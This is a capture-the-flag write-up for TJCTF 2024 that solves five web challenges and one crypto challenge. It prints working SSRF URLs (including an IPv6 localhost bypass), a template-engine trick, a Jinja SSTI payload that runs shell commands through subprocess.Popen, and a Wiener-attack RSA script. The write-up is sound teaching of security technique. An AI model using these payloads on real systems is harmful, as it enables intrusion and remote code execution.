---
title: "CTF - TJCTF 2024"
categories: [ctf]
date: 2024-05-19
comments: true
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - TJCTF 2024
---

# TJCTF 2024

Welcome to another CTF writeup. I did some CTFs early this year but didn't publish writeups, but here we are, back again. This time I played TJCTF 2024 in the weekend time. We participated as [ISwearGoogledIt](https://ctftime.org/team/109689) with [Razvi](https://razvioverflow.github.io/) and [Bubu](https://albertofdr.github.io/). We solved all the Web challenges, so if you miss some writeups, ask [Bubu](https://albertofdr.github.io/) to write them down 😉. Let's get started:

<br>

<p align="center">
  <img src="/images/writeups/TJCTF2024/banner.png" width="70%"/>
</p>

### Web
- [web/frog](#webfrog)
- [web/reader](#webreader)
- [web/fetcher](#webfetcher)
- [web/templater](#webtemplater)
- [web/music-checkout](#webmusic-checkout)


### Crypto
- [crypto/weird-crypto](#cryptoweird-crypto)


<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>

<br>

---

<br>

# Web

## web/frog
kpdfgo
311 solves / 108 points
I keep seeing frogs in my room at 2am... please help me get rid of them...

frog.tjc.tf

Go to robots.txt and find the following disallowed path:

```bash
https://frog.tjc.tf/robots.txt

User-agent: *
Disallow: /secret-frogger-78570618/
```

Visit that path and in the source code, there is a link to the flag (https://frog.tjc.tf/secret-frogger-78570618/flag-ed8f2331.txt):

<p align="center">
  <img src="/images/writeups/TJCTF2024/1_0_flag.png" width="80%"/>
</p>


``` tjctf{fr0gg3r_1_h4rdly_kn0w_h3r_3e1c574f} ```

<br>

## web/reader
sToro
144 solves / 119 points
Sites today have so much clutter, so I made a site to remove most of the extra stuff!
Attached files: server.zip
reader.tjc.tf

This challenge is a web challenge with [SSRF (Server-Side Request Forgery)](https://portswigger.net/web-security/ssrf). It visits a website of you choice. Checking the code, we can locate the flag at the _/monitor_ endpoint that only requires **request.remote_addr** to be "localhost" or "127.0.0.1":

```python
# snip...
@app.route("/")
def index():
    global log, log_count
    site_to_visit = request.args.get("site") or ""
    url = urlparse(site_to_visit)
    if not site_to_visit:
        return render_template("index.html")
    else:
        parser = etree.HTMLParser()
        try:
            response = get(site_to_visit).text
            tree = etree.fromstring(response, parser).getroottree()
            content = get_text_repr(tree, url.scheme + "://" + url.netloc)
        except Exception as e:
            print(e)
            log_count += 1
            if log_count >= MAX_LOGS:
                log.pop(0)
                log_count = MAX_LOGS
            log.append(str(e))
            tree = etree.fromstring(
                "<body>failed to load page</body>", parser
            ).getroottree()
            content = get_text_repr(tree, "")

        return render_template("site_view.html", content=content)


@app.route("/monitor")
def monitor():
    print(f"Rendering: {request.remote_addr}")
    if request.remote_addr in ("localhost", "127.0.0.1"):
        print("Rendering")
        return render_template(
            "admin.html", message=flag, errors="".join(log) or "No recent errors"
        )
    else:
        return render_template("admin.html", message="Unauthorized access", errors="")
# snip...
```

With the following URL, we access the monitor endpoint and get the flag:


https://reader.tjc.tf/?site=http://127.0.0.1:5000/monitor

<p align="center">
  <img src="/images/writeups/TJCTF2024/2_0_flag.png" width="65%"/>
</p>


``` tjctf{maybe_dont_make_random_server_side_requests_dd695b62} ```

<br>

## web/fetcher
kpdfgo
111 solves / 126 points
"that's so fetch!" - mean girls (2004)
Attached files: app.js

We have the following code:

```js
const express = require('express');
const fs = require('fs');
const app = express();

const flag = fs.readFileSync('flag.txt').toString();

app.use(express.urlencoded({ extended: false }));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/fetch', async (req, res) => {
    const url = req.body.url;

    if (!/^https?:\/\//.test(url))
        return res.send('invalid url');

    try {
        const checkURL = new URL(url);

        if (checkURL.host.includes('localhost') || checkURL.host.includes('127.0.0.1'))
            return res.send('invalid url');
    } catch (e) {
        return res.send('invalid url');
    }

    const r = await fetch(url, { redirect: 'manual' });
    const fetched = await r.text();
    res.send(fetched);
});

app.get('/flag', (req, res) => {
    if (req.ip !== '::ffff:127.0.0.1' && req.ip !== '::1' && req.ip !== '127.0.0.1')
        return res.send('bad ip');

    res.send(`hey myself! here's your flag: ${flag}`);
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});

```

As the previous challenge, there is a SSRF and the flag is located at **/flag** and it can only be accessed when the request IP is _"::ffff:127.0.0.1", "::1" or "127.0.0.1"_. The server uses some regex against the URL, and it does not allow to include _localhost_ or _127.0.0.1_. So, the only option of the previous 3 that will pass the regex is using the localhost IP _"::1"_. We skip all the issues we had with the instance and the only key in this challenge is that we have to include the port of the server in the payload:

http://[::1]:3000/flag

<p align="center">
  <img src="/images/writeups/TJCTF2024/5_0_fetch.png" width="65%"/>
</p>


<p align="center">
  <img src="/images/writeups/TJCTF2024/5_1_flag.png" width="65%"/>
</p>


<br>


## web/templater
kpdfgo
92 solves / 132 points
arghhhhhhhh jinja is so hard and bulky :(((
Attached files: app.py

We have the following code:

```python
from flask import Flask, request, redirect
import re

app = Flask(__name__)

flag = open('flag.txt').read().strip()

template_keys = {
    'flag': flag,
    'title': 'my website',
    'content': 'Hello, {{name}}!',
    'name': 'player'
}

index_page = open('index.html').read()

@app.route('/')
def index_route():
    return index_page

@app.route('/add', methods=['POST'])
def add_template_key():
    key = request.form['key']
    value = request.form['value']
    template_keys[key] = value
    print(template_keys)
    return redirect('/?msg=Key+added!')

@app.route('/template', methods=['POST'])
def template_route():
    s = request.form['template']
    
    s = template(s)

    print(s)
    if flag in s[0]:
        return 'No flag for you!', 403
    else:
        return s

def template(s):
    while True:
        m = re.match(r'.*({{.+?}}).*', s, re.DOTALL)
        if not m:
            break

        key = m.group(1)[2:-2]

        if key not in template_keys:
            return f'Key {key} not found!', 500

        s = s.replace(m.group(1), str(template_keys[key]))

    return s, 200

if __name__ == '__main__':
    app.run(port=5000)
```

Looking at the code, we can identify a homemade templating engine. The flag is located at **template_keys**, that are used in the **template()** function. We can use the keys as variables in out template and it will substitute them with the value in the dict. We have to retrieve the flag, but the script will check if the complete flag is in the response, so the idea is not to return the complete flag, but do it partially so we can skip the _if flag in s[0]:_ statement. 

The trick here is to play with the flag format _tjctf{.+}_ and the error when a template key is not found: _return f'Key {key} not found!', 500_. Since the algorithm is while true, it will check for all {{x}} instances, so using the curlybraces at the flag, we can trick the algorithm to look for the flag key in the **template_keys** dict this way:


- Insert the following key:value in the template_keys dict:

Key: f

Value: \{\{\{\{flag\}\}\}

- Use the following template:
\{\{f\}\}


- Initial state

s = "\{\{f\}\}"

- First iteration

s = "\{\{\{\{flag\}\}\}"

- Second iteration takeout {{flag}} for the real flag tjctf{.+}

s = "\{\{tjctf\{.+\}\}"

- Third iteration look for "tjctf{.+" in the template_keys dict, there is non, so return the error:

return f'Key \{tjctf\{.+\} not found!', 500

- We get the error:

"Key tjctf{t3mpl4t3r_1_h4rdly_kn0w_h3r_bf644616 not found!"



<p align="center">
  <img src="/images/writeups/TJCTF2024/3_0_add.png" width="65%"/>
</p>


<p align="center">
  <img src="/images/writeups/TJCTF2024/3_1_flag.png" width="65%"/>
</p>


``` tjctf{t3mpl4t3r_1_h4rdly_kn0w_h3r_bf644616} ```

<br>


## web/music-checkout
sToro
82 solves / 136 points
I've always thought it was a little rude for receiptify not to let you pick the songs that you think are important, so now you can!
Attached file: server.zip

We have the following code:

```python

from flask import Flask, render_template, request
import uuid

app = Flask(__name__)
app.static_folder = "static"


@app.route("/static/<path:path>")
def static_file(filename):
    return app.send_static_file(filename)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/create_playlist", methods=["POST"])
def post_playlist():
    try:
        username = request.form["username"]
        text = request.form["text"]
        if len(text) > 10_000:
            return "Too much!", 406
        if "{{" in text or "}}" in text:
            return "Nice try!", 406
        text = [line.split(",") for line in text.splitlines()]
        text = [line[:4] + ["?"] * (4 - min(len(line), 4)) for line in text]
        filled = render_template("playlist.html", username=username, songs=text)
        this_id = str(uuid.uuid4())
        with open(f"templates/uploads/{this_id}.html", "w") as f:
            f.write(filled)
        return render_template("created_playlist.html", uuid_val=this_id), 200
    except Exception as e:
        print(e)
        return "Internal server error", 500


@app.route("/view_playlist/<uuid:name>")
def view_playlist(name):
    name = str(name)
    try:
        return render_template(f"uploads/{name}.html")
    except Exception as e:
        print(e)
        return "checkout not found", 404


if __name__ == "__main__":
    app.run(port=5000, debug=True)

```

In the text field we have some filtering, but on the username not, so we go for an [SSTI](https://portswigger.net/web-security/server-side-template-injection):

```python
{% raw %}{{''.__class__.__mro__[1].__subclasses__()}}{% endraw %}

# It returns the set of classes, we like to use Popen to get RCE
...
<class "gunicorn.http.wsgi.Response">
<class "subprocess.CompletedProcess">
<class "subprocess.Popen"> # Line 337
<class "gunicorn.workers.workertmp.WorkerTmp">
...
```

- Classes:

<p align="center">
  <img src="/images/writeups/TJCTF2024/7_0_classes.png" width="90%"/>
</p>

We can use the following payload to list the directory and to retrieve the flag:

```python
{% raw %}# We use the subclasses 336 (Popen) as it was the index in the previous classes list
{{ ''.__class__.__mro__[1].__subclasses__()[336]('ls',shell=True,stdout=-1).communicate()[0].decode('utf-8') }}

# We can cat the flag:
{{''.__class__.__mro__[1].__subclasses__()[336]('cat flag.txt',shell=True,stdout=-1).communicate()[0].decode('utf-8') }}{% endraw %}
```

- ls:

<p align="center">
  <img src="/images/writeups/TJCTF2024/7_1_flag.png" width="55%"/>
</p>

- cat flag.txt

<p align="center">
  <img src="/images/writeups/TJCTF2024/7_2_flag.png" width="55%"/>
</p>

``` tjctf{such_quirky_taste_818602f2} ```

<br>

---

<br>

# Crypto

## crypto/weird-crypto
scienceqiu
151 solves / 118 points
weird crypto hmmm

We have the following code:

```python
from math import lcm
from Crypto.Util.number import bytes_to_long, getPrime

with open('flag.txt', 'rb') as f:
    flag = bytes_to_long(f.read().strip())

oops = getPrime(20)
p1 = getPrime(512)
p2 = getPrime(512)

haha = (p1-1)*(p2-1)
crazy_number = pow(oops, -1, haha)
discord_mod = p1 * p2
hehe_secret = pow(flag, crazy_number, discord_mod)

print('admin =', discord_mod)
print('hehe_secret =', hehe_secret)
print('crazy number =', crazy_number)
```

The code evolkes an RSA algorithm, let's rename the variables to spot the vulnerability:


```python
from math import lcm
from Crypto.Util.number import bytes_to_long, getPrime

with open('flag.txt', 'rb') as f:
    flag = bytes_to_long(f.read().strip())

random = getPrime(20)
p = getPrime(512)
q = getPrime(512)

n = p * q
phi_n = (p-1)*(q-1)
e = pow(random, -1, phi_n) # Issue

encripted = pow(cleartext, e, n)

print('admin =', n)
print('hehe_secret =', encripted)
print('crazy number =', e)
```

The algorithm is using a big exponent (_e_) and it is prone to [Wiener attack](https://en.wikipedia.org/wiki/Wiener%27s_attack). We can implement the following script to retrieve **d** for then decripting the message:

```python
import owiener

e = 13961211722558497461053729553295150730315735881906397707707726108341912436868560366671282172656669633051752478713856363392549457910240506816698590171533093796488195641999706024628359906449130009380765013072711649857727561073714362762834741590645780746758372687127351218867865135874062716318840013648817769047
n = 115527789319991047725489235818351464993028412126352156293595566838475726455437233607597045733180526729630017323042204168151655259688176759042620103271351321127634573342826484117943690874998234854277777879701926505719709998116539185109829000375668558097546635835117245793477957255328281531908482325475746699343
d = owiener.attack(e, n)

if d is None:
    print("Failed")
else:
    print("Hacked d={}".format(d))
```

The script get d with value 861079. I implemented the following script to get the flag:


```python
#!/usr/bin/env python3
import codecs

e = 13961211722558497461053729553295150730315735881906397707707726108341912436868560366671282172656669633051752478713856363392549457910240506816698590171533093796488195641999706024628359906449130009380765013072711649857727561073714362762834741590645780746758372687127351218867865135874062716318840013648817769047
n = 115527789319991047725489235818351464993028412126352156293595566838475726455437233607597045733180526729630017323042204168151655259688176759042620103271351321127634573342826484117943690874998234854277777879701926505719709998116539185109829000375668558097546635835117245793477957255328281531908482325475746699343
d = 861079 

msg = 10313360406806945962061388121732889879091144213622952631652830033549291457030908324247366447011281314834409468891636010186191788524395655522444948812334378330639344393086914411546459948482739784715070573110933928620269265241132766601148217497662982624793148613258672770168115838494270549212058890534015048102
flag = []

hexa = str(hex(pow(msg,d,n)))[2:]
print(hexa)

flag = codecs.decode(hexa, 'hex').decode('utf-8')
print(flag)
```

<p align="center">
  <img src="/images/writeups/TJCTF2024/6_0_flag.png" width="70%"/>
</p>

``` tjctf{congrats_on_rsa_e_djfkel2349!} ```

<br>

Great CTF, we enjoyed it. Thanks for reading!!